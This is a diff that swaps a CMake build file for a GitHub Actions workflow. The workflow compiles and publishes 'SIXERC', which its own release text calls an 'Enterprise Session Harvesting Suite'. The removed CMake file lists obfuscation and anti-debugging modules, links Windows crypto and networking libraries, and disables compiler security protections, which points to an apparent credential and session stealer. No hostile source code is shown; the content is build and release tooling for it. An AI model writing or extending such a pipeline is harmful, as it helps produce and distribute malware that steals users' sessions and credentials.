@@ -1,74 +1,62 @@
-cmake_minimum_required(VERSION 3.20)
-project(SIXERC VERSION 1.0.0 LANGUAGES CXX)
+name: Build SIXERC
 
-set(CMAKE_CXX_STANDARD 20)
-set(CMAKE_CXX_STANDARD_REQUIRED ON)
-set(CMAKE_CXX_EXTENSIONS OFF)
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
 
-# Static linking for standalone binary
-set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded\( < \)<CONFIG:Debug>:Debug>")
+jobs:
+  build-windows:
+    runs-on: windows-latest
 
-find_package(OpenSSL REQUIRED)
-find_package(CURL REQUIRED)
-find_package(nlohmann_json REQUIRED)
-find_package(unofficial-sqlite3 CONFIG REQUIRED)
+    env:
+      # x-gha backend was removed from vcpkg. Use filesystem cache instead.
+      VCPKG_BINARY_SOURCES: "clear;default,readwrite"
+      VCPKG_DEFAULT_BINARY_CACHE: ${{ github.workspace }}/vcpkg_cache
 
-set(SIXERC_SOURCES
-    src/main.cpp
-    src/core/crypto.cpp
-    src/core/utils.cpp
-    src/core/obfuscation.cpp
-    src/anti/antidebug.cpp
-    src/modules/bps.cpp
-    src/modules/tvre.cpp
-    src/modules/sic.cpp
-    src/modules/ep.cpp
-    src/modules/ph.cpp
-    src/modules/ksd.cpp
-)
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
 
-# Add Windows resource file with icon
-if(WIN32)
-    list(APPEND SIXERC_SOURCES src/sixerc.rc)
-endif()
+    - name: Create vcpkg binary cache directory
+      run: mkdir -p "${{ env.VCPKG_DEFAULT_BINARY_CACHE }}"
 
-add_executable(SIXERC ${SIXERC_SOURCES})
+    - name: Setup vcpkg
+      uses: lukka/run-vcpkg@v11
+      with:
+        # 2026.07.29 release — has current msys2/pkgconf URLs
+        vcpkgGitCommitId: '9e593bb18ea69cc5095e012465dcd675a822ed0d'
 
-target_include_directories(SIXERC PRIVATE src)
+    - name: Configure CMake
+      run: |
+        cmake -B build -S . `
+          -DCMAKE_TOOLCHAIN_FILE="${{ env.VCPKG_ROOT }}/scripts/buildsystems/vcpkg.cmake" `
+          -DVCPKG_TARGET_TRIPLET=x64-windows-static `
+          -DCMAKE_BUILD_TYPE=Release
 
-# Bracket argument keeps the apostrophe from breaking CMake parsing
-target_compile_definitions(SIXERC PRIVATE
-    NOMINMAX
-    WIN32_LEAN_AND_MEAN
-    _CRT_SECURE_NO_WARNINGS
-    SIXERC_VERSION="1.0.0"
-    SIXERC_AUTHOR="Anonymous-beta (Chinedu)"
-    [[SIXERC_CODENAME="Ekwensu's Grasp"]]
-    CURL_STATICLIB
-)
+    - name: Build SIXERC
+      run: cmake --build build --config Release --parallel
 
-target_link_libraries(SIXERC PRIVATE
-    OpenSSL::SSL
-    OpenSSL::Crypto
-    CURL::libcurl
-    nlohmann_json::nlohmann_json
-    unofficial::sqlite3::sqlite3
-    crypt32
-    advapi32
-    user32
-    shell32
-    ws2_32
-    wininet
-    shlwapi
-    dnsapi
-)
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: SIXERC-x64-Release
+        path: build/Release/SIXERC.exe
+        if-no-files-found: error
 
-# Release optimizations
-if(MSVC)
-    target_compile_options(SIXERC PRIVATE
-        /O2
-        /GS-
-        /guard:cf-
-        /sdl-
-    )
-endif()
+    - name: Create Release
+      if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
+      uses: softprops/action-gh-release@v2
+      with:
+        files: build/Release/SIXERC.exe
+        tag_name: v1.0.0
+        name: "SIXERC v1.0.0 — Ekwensu's Grasp"
+        body: |
+          SIXERC Enterprise Session Harvesting Suite
+          Creator: Anonymous-beta (Chinedu)
+          Codename: Ekwensu's Grasp
+        fail_on_unmatched_files: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
